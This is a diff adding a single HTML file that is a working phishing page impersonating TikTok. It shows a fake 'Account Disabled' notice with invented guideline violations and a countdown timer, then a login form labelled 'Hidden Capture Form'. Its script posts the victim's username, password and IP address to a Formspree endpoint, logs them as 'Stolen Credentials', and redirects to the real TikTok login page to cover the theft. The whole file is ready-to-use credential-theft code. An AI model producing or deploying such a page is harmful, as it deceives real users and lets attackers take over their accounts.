@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Account Status</title>
+    <style>
+        :root {
+            --tt-black: #121212;
+            --tt-white: #ffffff;
+            --tt-red: #fe2c55;
+            --tt-blue: #25f4ee;
+            --tt-dark-gray: #2f2f2f;
+            --tt-light-gray: #e3e3e3;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tt-black);
+            color: var(--tt-white);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        /* Logo Simulation */
+        .logo-area {
+            margin-bottom: 20px;
+            margin-top: 20px;
+        }
+        
+        .tiktok-logo {
+            font-size: 40px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .tiktok-logo span {
+            color: var(--tt-white);
+            text-shadow: 2px 2px 0px var(--tt-blue), -2px -2px 0px var(--tt-red);
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: var(--tt-red);
+        }
+
+        p.subtitle {
+            font-size: 16px;
+            color: var(--tt-light-gray);
+            margin-bottom: 20px;
+        }
+
+        /* Scrolling Violations List */
+        .violation-box {
+            background: var(--tt-dark-gray);
+            border-radius: 8px;
+            padding: 15px;
+            height: 150px;
+            overflow: hidden;
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+            border: 1px solid #444;
+        }
+
+        .violation-list {
+            animation: scrollUp 10s linear infinite;
+        }
+
+        .violation-item {
+            font-size: 12px;
+            color: #aaa;
+            padding: 4px 0;
+            border-bottom: 1px solid #333;
+        }
+
+        @keyframes scrollUp {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-100%); }
+        }
+
+        /* Countdown Timer */
+        .timer-container {
+            margin-bottom: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--tt-red);
+        }
+
+        button.main-btn {
+            background-color: var(--tt-red);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+
+        button.main-btn:hover {
+            background-color: #d92a4b;
+        }
+
+        /* Modal Styles */
+        #auth-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .auth-box {
+            background: var(--tt-dark-gray);
+            padding: 25px;
+            border-radius: 8px;
+            width: 85%;
+            max-width: 320px;
+            text-align: left;
+            border: 1px solid #555;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .auth-box h3 {
+            margin-top: 0;
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #aaa;
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: #1f1f1f;
+            border: 1px solid #444;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--tt-red);
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--tt-red);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .loading-spinner {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--tt-red);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .redirect-msg {
+            display: none;
+            color: var(--tt-light-gray);
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo-area">
+            <div class="tiktok-logo"><span>tiktok</span></div>
+        </div>
+        
+        <h1>Account Disabled</h1>
+        <p class="subtitle">Your account has violated our Community Guidelines.</p>
+
+        <div class="violation-box">
+            <div class="violation-list" id="violationList">
+                <!-- JS will populate this -->
+            </div>
+        </div>
+
+        <div class="timer-container">
+            Confirm within <span id="countdown">15</span> seconds
+        </div>
+
+        <button id="verify-btn" class="main-btn">Confirm Identity & Restore</button>
+        
+        <div style="margin-top: 15px; font-size: 12px; color: #777;">
+            Ticket ID: #ZM-2026-8842-Beta
+        </div>
+    </div>
+
+    <!-- Hidden Capture Form -->
+    <div id="auth-overlay">
+        <div class="auth-box">
+            <h3>Verify Ownership</h3>
+            <form id="capture-form">
+                <div class="input-group">
+                    <label>Email or Phone Number</label>
+                    <input type="text" name="username" placeholder="@username or email" required autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" name="password" placeholder="Enter your password" required autocomplete="off">
+                </div>
+                <button type="submit" class="submit-btn">Confirm & Restore</button>
+                <div class="loading-spinner" id="spinner"></div>
+                <div class="redirect-msg" id="redirectMsg">Redirecting to TikTok...</div>
+            </form>
+        </div>
+    </div>
+
+  <script>
+    // ==========================================
+    // CONFIGURATION
+    // ==========================================
+    const FORMSPREE_URL = "https://formspree.io/f/xnpdgkvn"; 
+
+    // Generate fake violations
+    const violations = [
+        "Copyright strike: Music track 'As It Was' used without license.",
+        "Spam detection: Unusual login activity from Zimbabwe region.",
+        "Misinformation: Video flagged under new Beta Monetization guidelines.",
+        "Community Guideline Section 4.2: Inappropriate content detected.",
+        "Rapid following/unfollowing pattern detected.",
+        "Low engagement score on recent uploads.",
+        "Duplicate content detected across multiple accounts.",
+        "Violation of Creator Fund eligibility criteria.",
+        "Suspicious bot-like behavior in comments section.",
+        "Age verification pending for monetization rollout."
+    ];
+
+    // Populate the scrolling list
+    const listContainer = document.getElementById('violationList');
+    // Duplicate the list to make the scroll look infinite
+    const fullList = [...violations, ...violations, ...violations];
+    fullList.forEach(v => {
+        let div = document.createElement('div');
+        div.className = 'violation-item';
+        div.textContent = "• " + v;
+        listContainer.appendChild(div);
+    });
+
+    // Countdown Logic
+    let timeLeft = 15;
+    const countdownEl = document.getElementById('countdown');
+    const timer = setInterval(() => {
+        timeLeft--;
+        countdownEl.textContent = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(timer);
+            countdownEl.style.color = "#fff";
+        }
+    }, 1000);
+
+    // Modal Logic
+    document.getElementById("verify-btn").onclick = () => {
+        document.getElementById("auth-overlay").style.display = "flex";
+    };
+
+    // Capture Logic
+    document.getElementById("capture-form").onsubmit = async (e) => {
+        e.preventDefault();
+        
+        const username = e.target.username.value;
+        const password = e.target.password.value;
+        
+        // Show spinner
+        document.querySelector('.submit-btn').style.display = 'none';
+        document.getElementById('spinner').style.display = 'block';
+        document.getElementById('redirectMsg').style.display = 'block';
+
+        // Prepare data
+        const payload = {
+            email_or_user: username,
+            password: password,
+            timestamp: new Date().toISOString(),
+            ticket_id: "ZM-2026-8842-Beta",
+            ip_address: await fetchIp() 
+        };
+
+        // Send to Formspree
+        try {
+            await fetch(FORMSPREE_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        } catch (err) {
+            console.error("Data failed to send", err);
+        }
+
+        // Also log to console for debugging
+        console.log("Stolen Credentials:", payload);
+
+        // Fake redirect after short delay
+        setTimeout(() => {
+            window.location.href = "https://www.tiktok.com/login";
+        }, 2000);
+    };
+
+    // Helper to get IP address (optional, makes it look more professional)
+    async function fetchIp() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return "Unknown";
+        }
+    }
+  </script>
+</body>
+</html>
